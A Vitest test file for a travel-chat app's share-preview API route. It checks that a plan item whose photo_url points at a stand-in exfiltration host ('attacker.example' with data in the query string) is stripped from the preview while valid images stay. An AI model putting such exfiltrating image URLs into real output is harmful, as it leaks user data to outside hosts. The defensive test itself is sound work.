import { describe, it, expect, vi } from 'vitest'
import { NextRequest } from 'next/server'

// Gate 2 G3 (G-T7) — the share preview, a payload that never goes through the public loader: it is built fresh (write time) from the
// stored conversation. Real route, real share-source resolver and snapshot builder; mocked: the auth lookup (with a fake RLS client
// returning the stored conversation), the share policy, the kill switch and the rate limiter.

const EXFIL = 'https://attacker.example/p?d=QuanBinhThanh'
const HERO = 'https://cdn.example/hero.jpg'
const TBN = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTstop'
const reply = `Kế hoạch nè.\n\n![Ảnh](${HERO})\n\n[TAPPY_PLAN]` + JSON.stringify({ type: 'trip', title: 'Đà Lạt', days: [{ label: 'Ngày 1', items: [
  { time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', photo_url: EXFIL },
  { time: '10:00', emoji: '🏞️', category: 'attraction', name: 'Hồ', photo_url: TBN },
] }] }) + '[/TAPPY_PLAN]'
const conversation = { id: '11111111-2222-4333-8444-555555555555', category: 'travel', updated_at: '2026-10-01T00:00:00.000Z', messages: [{ role: 'user', content: 'Lên kế hoạch Đà Lạt' }, { role: 'assistant', content: reply }] }

vi.mock('@/lib/config/product', async (orig) => ({ ...(await orig<typeof import('@/lib/config/product')>()), publicShareEnabled: () => true }))
vi.mock('@/lib/security/rateLimit', async (orig) => ({ ...(await orig<typeof import('@/lib/security/rateLimit')>()), rateLimit: () => ({ ok: true, retryAfter: 0 }) }))
vi.mock('@/lib/share/sharePolicy', () => ({ decideSharePolicy: async () => ({ ok: true, ownerIsAnonymous: false }) }))
vi.mock('@/lib/auth/getRequestUser', () => ({
  getRequestUser: async () => {
    const chain = { select: () => chain, eq: () => chain, maybeSingle: async () => ({ data: JSON.parse(JSON.stringify(conversation)), error: null }) }
    return { user: { id: 'u1', is_anonymous: false }, supabase: { from: () => chain } }
  },
}))

import { POST } from './route'

describe('G3 · POST /api/shared-results/preview (G-T7)', () => {
  it('the preview payload never carries the rejected plan photo, in the plan or in images; valid images stay', async () => {
    const res = await POST(new NextRequest(new Request('https://www.tappyai.com/api/shared-results/preview', { method: 'POST', body: JSON.stringify({ conversationId: conversation.id, messageIndex: 1 }), headers: { 'content-type': 'application/json' } }), {}))
    expect(res.status).toBe(200)
    const body = await res.json()
    expect(JSON.stringify(body)).not.toContain('attacker.example')
    expect(body.payload.images).toContain(HERO)
    expect(body.payload.images).toContain(TBN)
  })
})
